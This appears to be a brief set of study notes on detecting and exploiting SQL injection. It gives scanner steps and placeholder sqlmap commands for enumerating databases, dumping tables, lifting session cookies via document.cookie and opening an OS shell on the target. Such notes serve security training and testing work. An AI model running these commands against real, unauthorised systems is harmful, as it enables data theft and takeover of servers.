## SQL Injection

### Detecting SQL Injection
1. OWASP ZAP
   - Perform scan and observe alerts. Look for SQL Injection.
2. DSSS (Damn Small SQLi Scanner)
   - `cd DSSS`
   - `python3 dsss.py -u "<URL>" --cookie="<cookie value>"`
   - Copy vulnerable URL from the output and paste it in the browser to verify
3. SQLMap
   - `sqlmap -u "<URL>"`
   - `sqlmap -u "<URL>" --forms`

### Exploiting SQL Injection
[SQLMap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)

Extract cookies from browser console using `document.cookie`

If `--cookie` does not work, intercept request using burp suite and save the request in a text file. Then use `-r req.txt` to load the request from the file.
   1. Enumeration of databases 
      - `sqlmap -u "<URL>" --cookie="<cookie value>" --dbs`
   2. Enumeration of Tables in a Database
      - `sqlmap -u "<URL>" --cookie="<cookie value>" -D <database name> --tables`
   3. Dump the data from the database
      - `sqlmap -u "<URL>" --cookie="<cookie value>" -D <database name> -T <table name> --dump`
   4. Spawning an OS Shell with SQLMap
      - `sqlmap -u "<URL>" --cookie="<cookie value>" --os-shell` > `hostname` and verify